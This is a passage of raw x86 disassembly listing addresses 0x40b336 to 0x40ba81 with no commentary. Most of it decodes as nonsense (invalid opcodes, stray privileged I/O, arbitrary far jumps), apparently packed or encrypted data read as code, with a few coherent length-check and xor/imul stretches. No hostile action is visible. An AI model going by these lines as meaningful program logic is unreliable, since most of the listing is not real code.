  40b336:	mov    esi,0xfeea2e32
  40b33b:	cwde   
  40b33c:	add    ah,al
  40b33e:	shl    DWORD PTR [esi+edx*2+0x11a8dec4],0x79
  40b346:	mov    edi,0x1c3425a3
  40b34b:	rol    DWORD PTR [ebx-0x2e],0x9b
  40b34f:	fwait
  40b350:	jb     0x40b351
  40b352:	stos   DWORD PTR es:[edi],eax
  40b353:	test   eax,0xe7d8b0fb
  40b358:	xchg   ebp,eax
  40b359:	xchg   edi,eax
  40b35a:	sbb    DWORD PTR [eax],esi
  40b35c:	aad    0x98
  40b35e:	cs xchg ebx,eax
  40b360:	cmp    al,bl
  40b362:	push   edi
  40b363:	jae    0x40b320
  40b365:	adc    BYTE PTR [ecx-0x61fdb5b2],bl
  40b36b:	das    
  40b36c:	inc    eax
  40b36d:	fiadd  DWORD PTR ds:0xcd17bcc3
  40b373:	jle    0x40b383
  40b375:	jb     0x40b3e3
  40b377:	les    edi,FWORD PTR [eax]
  40b379:	in     al,0xb3
  40b37b:	sti    
  40b37c:	scas   eax,DWORD PTR es:[edi]
  40b37d:	jae    0x40b3da
  40b37f:	jno    0x40b348
  40b381:	int3   
  40b382:	jne    0x40b34f
  40b384:	xchg   edx,eax
  40b385:	out    0x7b,eax
  40b387:	scas   al,BYTE PTR es:[edi]
  40b388:	gs lock cdq 
  40b38b:	fcomp  QWORD PTR [esi-0x7b]
  40b38e:	cmpxchg8b QWORD PTR [ecx+0x8fd89d4]
  40b395:	retf   
  40b396:	pop    esi
  40b397:	(bad)  
  40b398:	scas   al,BYTE PTR es:[edi]
  40b399:	sbb    eax,0xe1ffb5b7
  40b39e:	cdq    
  40b39f:	test   BYTE PTR ds:0xa393cb42,bh
  40b3a5:	and    al,BYTE PTR ds:0x32c1b674
  40b3ab:	push   es
  40b3ac:	pushf  
  40b3ad:	mov    BYTE PTR [eax-0x3f],al
  40b3b0:	sub    cl,BYTE PTR [esi-0x10dbe81b]
  40b3b6:	int3   
  40b3b7:	ja     0x40b431
  40b3b9:	pop    esp
  40b3ba:	scas   eax,DWORD PTR es:[edi]
  40b3bb:	and    BYTE PTR [ecx],cl
  40b3bd:	adc    dh,0x78
  40b3c0:	sub    al,bh
  40b3c2:	jmp    0x67cebd7c
  40b3c7:	xchg   ebp,eax
  40b3c8:	sbb    DWORD PTR [edi+ebp*8-0x21],eax
  40b3cc:	retf   0xe3a7
  40b3cf:	mov    esi,0xb1d5cfc7
  40b3d4:	pop    ebx
  40b3d5:	or     BYTE PTR ds:0xd892ce7d,bh
  40b3db:	mov    esi,0xa0950028
  40b3e0:	arpl   WORD PTR [ebp-0x16cadbd5],sp
  40b3e6:	in     al,0x58
  40b3e8:	push   ecx
  40b3e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3ea:	push   edx
  40b3eb:	mov    bh,0x31
  40b3ed:	int3   
  40b3ee:	mov    esi,DWORD PTR [edi+0x2e]
  40b3f1:	sub    eax,0x92333c17
  40b3f6:	fwait
  40b3f7:	test   eax,0x11d0e2b
  40b3fc:	stos   BYTE PTR es:[edi],al
  40b3fd:	mov    WORD PTR [ecx+0x13],ss
  40b400:	je     0x40b412
  40b402:	stos   BYTE PTR es:[edi],al
  40b403:	adc    cl,BYTE PTR es:[ecx+0x7ff481ca]
  40b40a:	cli    
  40b40b:	mov    esi,0x6015f4f2
  40b410:	ss jns 0x40b441
  40b413:	ins    DWORD PTR es:[edi],dx
  40b414:	push   ebp
  40b415:	test   BYTE PTR [ebx],al
  40b417:	inc    esi
  40b418:	sub    ecx,DWORD PTR [ebx-0x17646f86]
  40b41e:	and    BYTE PTR ss:[edi+0x1535e0c9],al
  40b425:	jmp    0x40b4a6
  40b427:	mov    bh,BYTE PTR [edx+0x29b91cc9]
  40b42d:	rol    BYTE PTR [eax-0x67],cl
  40b430:	stos   DWORD PTR es:[edi],eax
  40b431:	iret   
  40b432:	loope  0x40b3f1
  40b434:	fistp  DWORD PTR [ebx-0x5bd808ae]
  40b43a:	fwait
  40b43b:	mov    ebp,0xc334b102
  40b440:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b441:	imul   edx,DWORD PTR [esi+ebx*2+0x54d8ca62],0x32
  40b449:	cld    
  40b44a:	and    DWORD PTR [ebx-0xd],ebp
  40b44d:	jmp    0x7c7c:0xc65f05c4
  40b454:	in     eax,dx
  40b455:	cdq    
  40b456:	add    eax,0x8fab20af
  40b45b:	iret   
  40b45c:	mov    ecx,0x6a17e81c
  40b461:	adc    al,0x44
  40b463:	jle    0x40b455
  40b465:	fnstsw WORD PTR [ecx-0x52]
  40b468:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b469:	stos   BYTE PTR es:[edi],al
  40b46a:	xchg   edi,eax
  40b46b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b46c:	add    BYTE PTR [ebx+0x29],bl
  40b46f:	in     eax,0x2c
  40b471:	div    BYTE PTR [esi-0x3f]
  40b474:	(bad)  
  40b475:	pop    esp
  40b476:	sar    BYTE PTR [ebp+0x1ae5bf3f],0xe1
  40b47d:	mov    BYTE PTR [ecx-0x6a5ad7fb],ch
  40b483:	scas   eax,DWORD PTR es:[edi]
  40b484:	push   es
  40b485:	hlt    
  40b486:	jge    0x40b470
  40b488:	adc    al,0xda
  40b48a:	mov    esp,0x7cb7b052
  40b48f:	stos   BYTE PTR es:[edi],al
  40b490:	ins    DWORD PTR es:[edi],dx
  40b491:	push   0x9b5ec4b7
  40b496:	int3   
  40b497:	sbb    edi,DWORD PTR [ebp+ecx*4+0x6f3a5046]
  40b49e:	aas    
  40b49f:	test   ah,ch
  40b4a1:	mov    ?,WORD PTR [edx-0x8]
  40b4a4:	fild   QWORD PTR [eax-0x573101c7]
  40b4aa:	(bad)  
  40b4ac:	fisttp DWORD PTR [ebx-0x46699b40]
  40b4b2:	test   DWORD PTR [edx-0x61cc00a],esi
  40b4b8:	cmp    ebp,DWORD PTR [esi+0x59]
  40b4bb:	outs   dx,BYTE PTR ds:[esi]
  40b4bc:	int3   
  40b4bd:	ins    DWORD PTR es:[edi],dx
  40b4be:	inc    ecx
  40b4bf:	add    edx,DWORD PTR [ebx+ebp*2-0x7b]
  40b4c3:	fs (bad) 
  40b4c5:	jbe    0x40b497
  40b4c7:	(bad)  
  40b4c8:	and    al,0x6
  40b4ca:	ret    0xc89d
  40b4cd:	cs pop ecx
  40b4cf:	push   esp
  40b4d0:	mov    ah,0x6f
  40b4d2:	pop    edi
  40b4d3:	(bad)  
  40b4d4:	and    DWORD PTR [ebp+0x7cdeaa78],ebp
  40b4da:	pop    ebx
  40b4db:	fisttp DWORD PTR [edx]
  40b4dd:	dec    eax
  40b4de:	jge    0x40b49c
  40b4e0:	popa   
  40b4e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4e2:	mov    bl,0x73
  40b4e4:	push   esp
  40b4e5:	data16 cli 
  40b4e7:	jbe    0x40b4f8
  40b4e9:	mov    BYTE PTR [edi+edx*2],bl
  40b4ec:	or     al,0x63
  40b4ee:	mov    ah,0x80
  40b4f0:	out    0x49,eax
  40b4f2:	out    0x46,al
  40b4f4:	(bad)  
  40b4f5:	fwait
  40b4f6:	rcr    BYTE PTR [edi+0x14ea49f],1
  40b4fc:	btr    DWORD PTR [eax],ebp
  40b4ff:	cmp    ah,BYTE PTR [edi]
  40b501:	inc    ebp
  40b502:	loope  0x40b4ff
  40b504:	mov    al,0x21
  40b506:	jae    0x40b537
  40b508:	aaa    
  40b509:	push   ss
  40b50a:	js     0x40b563
  40b50c:	xor    eax,0x4043e124
  40b511:	jb     0x40b532
  40b513:	cmp    ecx,DWORD PTR [edi]
  40b515:	lds    ecx,FWORD PTR [edx+ecx*2+0x12c9d21f]
  40b51c:	sbb    eax,0xf2ba1a0
  40b521:	scas   eax,DWORD PTR es:[edi]
  40b522:	xlat   BYTE PTR ds:[ebx]
  40b523:	mov    edi,DWORD PTR [ebp-0x8]
  40b526:	mov    ebx,DWORD PTR [ebp-0x10]
  40b529:	sub    ebx,edi
  40b52b:	cmp    ebx,edx
  40b52d:	ja     0x40b53b
  40b533:	mov    edx,DWORD PTR [ebp-0x2c]
  40b536:	jmp    0x40c0ee
  40b53b:	mov    edx,DWORD PTR [ebp-0x34]
  40b53e:	jmp    0x40b8fc
  40b543:	cmp    eax,0x7178931c
  40b548:	mov    bh,0x49
  40b54a:	loope  0x40b546
  40b54c:	loop   0x40b5b2
  40b54e:	pop    edx
  40b54f:	repz mov ah,0x5d
  40b552:	(bad)
  40b555:	jo     0x40b5c7
  40b557:	lahf   
  40b558:	jge    0x40b5ca
  40b55a:	jo     0x40b51f
  40b55c:	cmp    DWORD PTR [ecx+0x72],ebx
  40b55f:	(bad)  
  40b560:	fisubr WORD PTR [eax-0x254fe7f2]
  40b566:	popf   
  40b567:	(bad)  
  40b568:	mov    eax,ds:0xdda909e4
  40b56d:	lahf   
  40b56e:	xor    al,0xcc
  40b570:	or     ah,BYTE PTR [ecx-0x34f00ec]
  40b576:	pop    esp
  40b577:	sar    ah,1
  40b579:	std    
  40b57a:	shl    DWORD PTR [ecx],0x31
  40b57d:	stos   DWORD PTR es:[edi],eax
  40b57e:	jae    0x40b5ab
  40b580:	xor    BYTE PTR [esi+0x4c],0xf8
  40b584:	mov    ebx,0xf41fe8df
  40b589:	cli    
  40b58a:	lods   al,BYTE PTR ds:[esi]
  40b58b:	and    bh,BYTE PTR [ebx]
  40b58d:	(bad)  
  40b58e:	xchg   DWORD PTR [eax],ebx
  40b590:	push   ecx
  40b591:	mov    cl,0x4a
  40b593:	dec    ecx
  40b594:	mov    fs,WORD PTR [ebp+0x62201e68]
  40b59a:	xchg   DWORD PTR [ebp+0x17],ebx
  40b59d:	adc    al,0xf
  40b59f:	leave  
  40b5a0:	dec    eax
  40b5a1:	pop    edx
  40b5a2:	dec    esp
  40b5a3:	or     ah,BYTE PTR [ebx-0x11aa7099]
  40b5a9:	(bad)  
  40b5aa:	push   0x7e95b997
  40b5af:	and    DWORD PTR [esp+eiz*8-0xa3a5398],eax
  40b5b6:	sbb    BYTE PTR [ebx],dl
  40b5b8:	mov    es,WORD PTR [ecx]
  40b5ba:	retw   0xe4ef
  40b5be:	gs or  al,0xfd
  40b5c1:	dec    edi
  40b5c2:	add    BYTE PTR [ebp+0x8500154],al
  40b5c8:	out    dx,al
  40b5c9:	or     bl,BYTE PTR [esp+ebx*8]
  40b5cc:	retf   
  40b5cd:	das    
  40b5ce:	pop    ecx
  40b5cf:	das    
  40b5d0:	push   esp
  40b5d1:	jecxz  0x40b5af
  40b5d3:	imul   eax,DWORD PTR ds:0xcf4a2563,0xb24d1f86
  40b5dd:	and    DWORD PTR [ebp+0x2e],esp
  40b5e0:	inc    esi
  40b5e1:	sub    al,0xcd
  40b5e3:	(bad)  
  40b5e4:	xor    bh,BYTE PTR [edx-0x1f]
  40b5e7:	mov    ah,0xaa
  40b5e9:	or     al,0x56
  40b5eb:	inc    ecx
  40b5ec:	add    dh,BYTE PTR [esi+0x3be65a09]
  40b5f2:	add    BYTE PTR ds:0x65be512a,ch
  40b5f8:	stos   BYTE PTR es:[edi],al
  40b5f9:	mov    ebp,0xbcc30826
  40b5fe:	(bad)  
  40b5ff:	pop    edi
  40b600:	jnp    0x40b628
  40b602:	inc    ecx
  40b603:	xlat   BYTE PTR ds:[ebx]
  40b604:	jecxz  0x40b639
  40b606:	(bad)  
  40b608:	fstp   DWORD PTR [ecx+0x23]
  40b60b:	mov    ah,0xda
  40b60d:	test   DWORD PTR [eax],esi
  40b60f:	scas   eax,DWORD PTR es:[edi]
  40b610:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b611:	mov    eax,ds:0x8cbef409
  40b616:	stos   DWORD PTR es:[edi],eax
  40b617:	dec    ecx
  40b618:	aad    0xa8
  40b61a:	inc    edx
  40b61b:	loopne 0x40b5c9
  40b61d:	(bad)  
  40b61e:	ins    DWORD PTR es:[edi],dx
  40b61f:	or     eax,0x62b1cf69
  40b624:	icebp  
  40b625:	or     BYTE PTR [edx+0xc],0xcd
  40b629:	cmp    bh,BYTE PTR [esi+eax*4]
  40b62c:	sbb    ecx,esi
  40b62e:	lock retf 
  40b630:	shl    BYTE PTR [edi-0x1a],0x0
  40b634:	inc    edx
  40b635:	stos   DWORD PTR es:[edi],eax
  40b636:	push   edi
  40b637:	adc    DWORD PTR [edx+0x4],edi
  40b63a:	aas    
  40b63b:	pop    edx
  40b63c:	rol    DWORD PTR [edi+0x10],1
  40b63f:	out    0xae,eax
  40b641:	mov    ch,0x81
  40b643:	mov    ebx,0xb3b394c2
  40b648:	sub    dh,BYTE PTR [edi+ebp*2-0xe]
  40b64c:	retf   0x4e01
  40b64f:	cmp    BYTE PTR [edx],ch
  40b651:	xchg   esp,eax
  40b652:	loopne 0x40b667
  40b654:	jmp    0x40b6cd
  40b656:	add    al,0x4b
  40b658:	hlt    
  40b659:	sahf   
  40b65a:	sbb    edx,DWORD PTR [ecx+ebx*2]
  40b65d:	jb     0x40b669
  40b65f:	bound  edx,QWORD PTR [edi]
  40b661:	xlat   BYTE PTR ds:[ebx]
  40b662:	mov    al,ds:0xe3f337a7
  40b667:	out    dx,al
  40b668:	and    BYTE PTR [esi],0xf3
  40b66b:	call   0xd232:0x17628c5b
  40b672:	xchg   esi,eax
  40b673:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b674:	fdivp  st(0),st
  40b676:	cmp    eax,DWORD PTR [eax+0x463aab9d]
  40b67c:	ret    
  40b67d:	outs   dx,DWORD PTR ds:[esi]
  40b67e:	inc    esi
  40b67f:	mov    dh,0x4c
  40b681:	(bad)  
  40b682:	ds cmp eax,0xd1b8b9bf
  40b688:	mov    al,al
  40b68a:	test   al,0x7b
  40b68c:	inc    eax
  40b68d:	in     eax,dx
  40b68e:	ficom  DWORD PTR [edx-0x7b]
  40b691:	sbb    ecx,0x26
  40b694:	mov    dh,0xaf
  40b696:	mov    esi,0x3ba51f64
  40b69b:	call   0x8d99:0x11ee3331
  40b6a2:	(bad)  
  40b6a3:	out    dx,eax
  40b6a4:	or     DWORD PTR [ecx],0x330fcd8d
  40b6aa:	nop
  40b6ab:	jno    0x40b67f
  40b6ad:	loopne 0x40b6a2
  40b6af:	push   cs
  40b6b0:	mov    ds:0xf2036a84,al
  40b6b5:	fld    QWORD PTR [ebp+0x74]
  40b6b8:	sbb    ebx,edi
  40b6ba:	push   esp
  40b6bb:	mov    dl,0x7d
  40b6bd:	leave  
  40b6be:	push   es
  40b6bf:	xor    BYTE PTR [ecx+0x2f],al
  40b6c2:	aas    
  40b6c3:	xor    al,ah
  40b6c5:	xcrypt-cbc (bad)
  40b6c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6c7:	xchg   esp,eax
  40b6c8:	aad    0x56
  40b6ca:	mov    ah,0x8c
  40b6cc:	pusha  
  40b6cd:	add    edi,DWORD PTR [edi-0x59]
  40b6d0:	out    0xcf,al
  40b6d2:	pop    eax
  40b6d3:	inc    esi
  40b6d4:	mov    ecx,0x8b94976b
  40b6d9:	jno    0x40b70a
  40b6db:	add    edi,DWORD PTR [eax+0x40]
  40b6de:	dec    ebp
  40b6df:	sub    cl,dl
  40b6e1:	sbb    DWORD PTR ds:0x1ad9b7e4,0xffffffd4
  40b6e8:	stos   DWORD PTR es:[edi],eax
  40b6e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6ea:	in     al,0x27
  40b6ec:	sbb    al,0xf0
  40b6ee:	or     esi,esi
  40b6f0:	pop    ds
  40b6f1:	cli    
  40b6f2:	test   eax,0x1f977d9
  40b6f7:	sbb    edi,DWORD PTR [edi+0x654a9b16]
  40b6fd:	and    eax,DWORD PTR [ebx]
  40b6ff:	mov    eax,ds:0x60290eb1
  40b704:	arpl   WORD PTR [edx+0xd],sp
  40b707:	xlat   BYTE PTR ds:[ebx]
  40b708:	js     0x40b787
  40b70a:	mov    ecx,0xae15a00e
  40b70f:	mov    ss,WORD PTR [ecx-0x5bdc6f7c]
  40b715:	sub    eax,0xa77f977
  40b71a:	cmc    
  40b71b:	enter  0xdb4,0xac
  40b71f:	cs dec eax
  40b721:	sub    edi,esp
  40b723:	sbb    eax,0x4507e965
  40b728:	jb     0x40b705
  40b72a:	xchg   ebp,eax
  40b72b:	sub    edx,DWORD PTR ds:[eax]
  40b72e:	lock imul ebx,esi,0xffffff89
  40b732:	cmp    eax,0x7676bc37
  40b737:	ins    BYTE PTR es:[edi],dx
  40b738:	cmp    esi,DWORD PTR [edx+0x64]
  40b73b:	fistp  QWORD PTR [edi-0x60]
  40b73e:	out    dx,eax
  40b73f:	ror    DWORD PTR [edx-0x7c],1
  40b742:	dec    ebx
  40b743:	mov    esp,0x5ff21e7e
  40b748:	push   0x450476fb
  40b74d:	stos   DWORD PTR es:[edi],eax
  40b74e:	dec    esp
  40b74f:	scas   eax,DWORD PTR es:[edi]
  40b750:	dec    ebp
  40b751:	xchg   esi,eax
  40b752:	sub    al,0x2c
  40b754:	in     eax,dx
  40b755:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b756:	jp     0x40b7b4
  40b758:	stos   DWORD PTR es:[edi],eax
  40b759:	mov    DWORD PTR [ecx-0x3d243a0f],0x6a630731
  40b763:	mov    edi,0x256575ea
  40b768:	icebp  
  40b769:	inc    edx
  40b76a:	xchg   edi,eax
  40b76b:	mov    ds:0xacbbb563,eax
  40b770:	xchg   DWORD PTR [esi],ebx
  40b772:	xchg   edi,eax
  40b773:	cmp    ebx,edx
  40b775:	dec    ecx
  40b776:	clc    
  40b777:	xor    esp,DWORD PTR [esi-0x6be0b9a6]
  40b77d:	in     al,0x1c
  40b77f:	shl    BYTE PTR [edx+eax*4-0x341e5619],1
  40b786:	test   eax,0x1c8a8daa
  40b78b:	fistp  DWORD PTR [ebx+0x1b]
  40b78e:	push   ecx
  40b78f:	pop    ebx
  40b790:	jo     0x40b75b
  40b792:	jmp    0xd8b6:0xf05e52e7
  40b799:	pop    ds
  40b79a:	adc    BYTE PTR [esi-0x5f],ah
  40b79d:	test   DWORD PTR [edx+0x78c71780],eax
  40b7a3:	std    
  40b7a4:	inc    edi
  40b7a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7a6:	(bad)  
  40b7a7:	push   cs
  40b7a8:	sub    bl,BYTE PTR [ebp+0x69]
  40b7ab:	pushf  
  40b7ac:	scas   eax,DWORD PTR es:[edi]
  40b7ad:	add    eax,ebx
  40b7af:	mov    al,0xa
  40b7b1:	pop    edx
  40b7b2:	cs jg  0x40b78e
  40b7b5:	aaa    
  40b7b6:	push   ss
  40b7b7:	push   edx
  40b7b8:	inc    eax
  40b7b9:	jmp    0xa83f4fbf
  40b7be:	rol    ebp,1
  40b7c0:	mov    ch,0x39
  40b7c2:	push   cs
  40b7c3:	adc    bl,BYTE PTR [ecx+ebx*1]
  40b7c6:	(bad)  
  40b7c7:	pop    DWORD PTR [edi+0x6d]
  40b7ca:	out    dx,eax
  40b7cb:	push   esi
  40b7cc:	sub    BYTE PTR ds:0x8ff4fd10,dl
  40b7d2:	ss cli 
  40b7d4:	(bad)  
  40b7d5:	jnp    0x40b82f
  40b7d7:	or     eax,DWORD PTR [eax+0x2cb8203a]
  40b7dd:	(bad)  
  40b7de:	jmp    0x7efd:0x873eccda
  40b7e5:	loop   0x40b807
  40b7e7:	fld    TBYTE PTR [ecx+0x6b]
  40b7ea:	pop    eax
  40b7eb:	jae    0x40b7e2
  40b7ed:	int3   
  40b7ee:	push   edi
  40b7ef:	repnz (bad) 
  40b7f1:	inc    BYTE PTR [esi+0x315d2ff0]
  40b7f7:	out    0xb,eax
  40b7f9:	and    DWORD PTR [esi],esi
  40b7fb:	inc    edi
  40b7fc:	xchg   DWORD PTR [eax+ebx*2-0x3a],esp
  40b800:	inc    edi
  40b801:	mov    ebp,DWORD PTR fs:[edi]
  40b804:	pop    edi
  40b805:	sbb    ebp,DWORD PTR [edx]
  40b807:	push   es
  40b808:	mov    es,WORD PTR ds:0xb1be2e64
  40b80e:	sub    BYTE PTR [esi],bl
  40b810:	xchg   edx,eax
  40b811:	mov    esi,0x82de4f98
  40b816:	mov    ebx,0xfa186603
  40b81b:	pushf  
  40b81c:	dec    eax
  40b81d:	les    ecx,FWORD PTR [esi]
  40b81f:	mov    dl,0x3b
  40b821:	repnz fstp DWORD PTR [eax-0x7f]
  40b825:	dec    ebp
  40b826:	test   BYTE PTR [esi-0x6c],ah
  40b829:	pop    ds
  40b82a:	in     al,dx
  40b82b:	lods   al,BYTE PTR ds:[esi]
  40b82c:	sub    BYTE PTR [edx+eiz*8-0x79],bl
  40b830:	enter  0x7446,0x7f
  40b834:	lods   eax,DWORD PTR ds:[esi]
  40b835:	jmp    0x79e0:0x300c595b
  40b83c:	pop    edx
  40b83d:	mov    ebx,0x9c0a89ca
  40b842:	dec    eax
  40b843:	add    bl,bl
  40b845:	inc    esi
  40b846:	test   BYTE PTR [edx],bh
  40b848:	or     DWORD PTR [eax+0x65],0xffffff9b
  40b84c:	enter  0x5d34,0x8
  40b850:	mov    edi,0xf1961bb4
  40b855:	ins    DWORD PTR es:[edi],dx
  40b856:	xchg   ebx,eax
  40b857:	lock jge 0x40b824
  40b85a:	out    dx,al
  40b85b:	xor    DWORD PTR ds:0x3db261b0,eax
  40b861:	out    0xc,eax
  40b863:	clc    
  40b864:	push   edi
  40b865:	dec    ebx
  40b866:	cmp    al,0x25
  40b868:	daa    
  40b869:	sub    al,0xd2
  40b86b:	sub    DWORD PTR [esi+eax*2],0xcff7d038
  40b872:	hlt    
  40b873:	add    ah,BYTE PTR [di-0x699d]
  40b878:	loope  0x40b869
  40b87a:	mov    esp,0x82ab8883
  40b87f:	(bad)  
  40b881:	(bad)  
  40b882:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b884:	out    0xee,al
  40b886:	mov    ebp,0x14768319
  40b88b:	dec    ecx
  40b88c:	xor    esp,DWORD PTR [esi]
  40b88e:	jbe    0x40b895
  40b890:	xchg   ebx,eax
  40b891:	retf   
  40b892:	test   ecx,0x8befe28c
  40b898:	lods   al,BYTE PTR ds:[esi]
  40b899:	mov    esi,0xba1592c1
  40b89e:	stos   DWORD PTR es:[edi],eax
  40b89f:	push   ss
  40b8a0:	sbb    al,0x8d
  40b8a2:	js     0x40b90e
  40b8a4:	lds    ebx,FWORD PTR [esi]
  40b8a6:	retf   0x836e
  40b8a9:	sbb    bh,dl
  40b8ab:	pop    esp
  40b8ac:	mov    ebp,0x769ee7ff
  40b8b1:	xor    eax,DWORD PTR [eax-0x70cdd71d]
  40b8b7:	rol    ecx,1
  40b8b9:	adc    DWORD PTR [ebx-0x2b],esi
  40b8bc:	jp     0x40b87a
  40b8be:	fldenv [ebx-0x48a8a789]
  40b8c4:	sbb    DWORD PTR [eax-0x6e2a8843],0xcfb9ed03
  40b8ce:	inc    edx
  40b8cf:	mov    al,ds:0x8ca5c762
  40b8d4:	mov    es,WORD PTR [eax]
  40b8d6:	daa    
  40b8d7:	inc    eax
  40b8d8:	arpl   WORD PTR [ebx+eax*2-0x56c059bf],sp
  40b8df:	enter  0xd479,0x8c
  40b8e3:	test   BYTE PTR [esi+0x4ca75fcf],bh
  40b8e9:	xchg   eax,ecx
  40b8eb:	mov    bh,0xda
  40b8ed:	test   BYTE PTR [eax-0x48997b34],cl
  40b8f3:	addr16 test al,0x47
  40b8f6:	mov    bl,0x74
  40b8f8:	jle    0x40b96d
  40b8fa:	inc    ebp
  40b8fb:	adc    al,0x8b
  40b8fd:	jge    0x40b8fb
  40b8ff:	xor    edx,eax
  40b901:	xor    edi,eax
  40b903:	add    edi,ecx
  40b905:	add    edx,ecx
  40b907:	imul   edx,edi
  40b90a:	mov    edi,DWORD PTR [ebp-0x8]
  40b90d:	mov    ebx,DWORD PTR [ebp-0x10]
  40b910:	sub    ebx,edi
  40b912:	cmp    ebx,edx
  40b914:	ja     0x40b922
  40b91a:	mov    edx,DWORD PTR [ebp-0x30]
  40b91d:	jmp    0x40c0ee
  40b922:	mov    edx,DWORD PTR [ebp-0x38]
  40b925:	mov    edi,DWORD PTR [ebp-0x4]
  40b928:	xor    edx,eax
  40b92a:	xor    edi,eax
  40b92c:	add    edi,ecx
  40b92e:	add    edx,ecx
  40b930:	imul   edx,edi
  40b933:	mov    edi,DWORD PTR [ebp-0x8]
  40b936:	jmp    0x40bcf4
  40b93b:	xchg   ebp,eax
  40b93c:	fcomi  st,st(6)
  40b93e:	push   esi
  40b93f:	jb     0x40b992
  40b941:	mov    ch,0xdb
  40b943:	shl    BYTE PTR [ebx-0x32739905],cl
  40b949:	push   sp
  40b94b:	pusha  
  40b94c:	xor    DWORD PTR [eax+0x70],0xffffff9f
  40b950:	jge    0x40b9c2
  40b952:	jo     0x40b926
  40b954:	xor    edi,edx
  40b956:	out    0x7d,al
  40b958:	xlat   BYTE PTR ds:[ebx]
  40b959:	cmp    BYTE PTR ds:[edi-0x2955e20c],al
  40b960:	jecxz  0x40b9c4
  40b962:	mov    dl,0xc8
  40b964:	mov    cl,BYTE PTR [edi+0x1b127333]
  40b96a:	cwde   
  40b96b:	mov    bl,0x6e
  40b96d:	das    
  40b96e:	inc    ebx
  40b96f:	shl    DWORD PTR [edi-0x4],0x29
  40b973:	sbb    BYTE PTR [eax],dh
  40b975:	push   ss
  40b976:	or     al,0xdf
  40b978:	cmp    eax,0x8cf464f5
  40b97d:	xchg   DWORD PTR [edx+0x6c],ecx
  40b980:	out    dx,eax
  40b981:	cdq    
  40b982:	retf   
  40b983:	pop    ds
  40b984:	ror    BYTE PTR [ecx],0x4f
  40b987:	ja     0x40b9c4
  40b989:	or     eax,0xd5bc26b2
  40b98e:	les    eax,FWORD PTR [edi+0x2d0872fa]
  40b994:	call   0x65ae9b5a
  40b999:	add    BYTE PTR [ebx],bh
  40b99b:	and    BYTE PTR [edi],0x87
  40b99e:	fistp  WORD PTR [eax-0x53]
  40b9a1:	outs   dx,BYTE PTR ds:[esi]
  40b9a2:	lahf   
  40b9a3:	loop   0x40b94a
  40b9a5:	sbb    ecx,DWORD PTR [ebp-0x42]
  40b9a8:	int    0x60
  40b9aa:	or     ah,ah
  40b9ac:	in     eax,0xbf
  40b9ae:	adc    DWORD PTR [esi+0x50],esi
  40b9b1:	cmc    
  40b9b2:	repz and DWORD PTR ds:0xf56ddbf2,0x20bb4904
  40b9bd:	ja     0x40b9c6
  40b9bf:	sti    
  40b9c0:	mov    DWORD PTR [ecx+ebp*8+0x348100fa],ecx
  40b9c7:	push   edx
  40b9c8:	js     0x40b998
  40b9ca:	leave  
  40b9cb:	pop    edx
  40b9cc:	push   ds
  40b9cd:	aas    
  40b9ce:	push   ds
  40b9cf:	pushf  
  40b9d0:	out    dx,eax
  40b9d1:	jge    0x40b9cb
  40b9d3:	mov    DWORD PTR ds:0xb3e36d4a,eax
  40b9d9:	mov    dh,0x54
  40b9db:	or     al,0xa0
  40b9dd:	jmp    0x6b86c357
  40b9e2:	jl     0x40b9ca
  40b9e4:	inc    edi
  40b9e5:	stc    
  40b9e6:	cmp    edx,esp
  40b9e8:	sub    edi,DWORD PTR [eax]
  40b9ea:	xchg   ebx,eax
  40b9eb:	dec    edx
  40b9ec:	pop    es
  40b9ed:	xchg   DWORD PTR [edi-0xa],edx
  40b9f0:	xor    eax,0xf44188f8
  40b9f5:	and    ebx,ebp
  40b9f7:	adc    eax,0x6c1abf20
  40b9fc:	and    DWORD PTR [ebp+0x1e1a5156],eax
  40ba02:	mov    ebp,0xf9c28050
  40ba07:	sahf   
  40ba08:	arpl   WORD PTR [edx-0x9926fc6],dx
  40ba0e:	ja     0x40b9aa
  40ba10:	out    dx,al
  40ba11:	or     edi,edi
  40ba13:	(bad)  
  40ba14:	aas    
  40ba15:	xor    DWORD PTR [edi+ecx*1-0x59],esp
  40ba19:	inc    edi
  40ba1a:	fwait
  40ba1b:	leave  
  40ba1c:	inc    edx
  40ba1d:	stos   DWORD PTR es:[edi],eax
  40ba1e:	test   eax,0xed5153a7
  40ba23:	aad    0x5a
  40ba25:	dec    esi
  40ba26:	jg     0x40ba8b
  40ba28:	push   es
  40ba29:	les    ebp,FWORD PTR [esi]
  40ba2b:	js     0x40baa6
  40ba2d:	dec    edi
  40ba2e:	arpl   sp,cx
  40ba30:	je     0x40b9f1
  40ba32:	cmp    ch,dh
  40ba34:	popa   
  40ba35:	inc    ebp
  40ba36:	mov    ebp,0xae6c203d
  40ba3b:	ret    0x1471
  40ba3e:	and    eax,0x364cf208
  40ba43:	cdq    
  40ba44:	cld    
  40ba45:	into   
  40ba46:	jae    0x40ba19
  40ba48:	inc    ecx
  40ba49:	push   esi
  40ba4a:	in     eax,0xc8
  40ba4c:	dec    esi
  40ba4d:	leave  
  40ba4e:	call   0xb29fa826
  40ba53:	les    eax,FWORD PTR [esi]
  40ba55:	fcomp  DWORD PTR [ebx-0x5b]
  40ba58:	pop    esi
  40ba59:	push   ebx
  40ba5a:	cmp    DWORD PTR [eax-0xa],esi
  40ba5d:	mov    ds:0x5716f398,eax
  40ba62:	faddp  st(1),st
  40ba64:	dec    edi
  40ba65:	ins    DWORD PTR es:[edi],dx
  40ba66:	mov    esp,0xc7c722e1
  40ba6b:	xchg   edx,eax
  40ba6c:	in     eax,dx
  40ba6d:	mov    ds:0xb56d4acf,eax
  40ba72:	stos   BYTE PTR es:[edi],al
  40ba73:	imul   ebx,DWORD PTR [edx-0x678daa39],0x47ac5c22
  40ba7d:	iret   
  40ba7e:	retf   
  40ba7f:	jmp    0x40ba57
  40ba81:	lea    eax,[ebx-0x46]
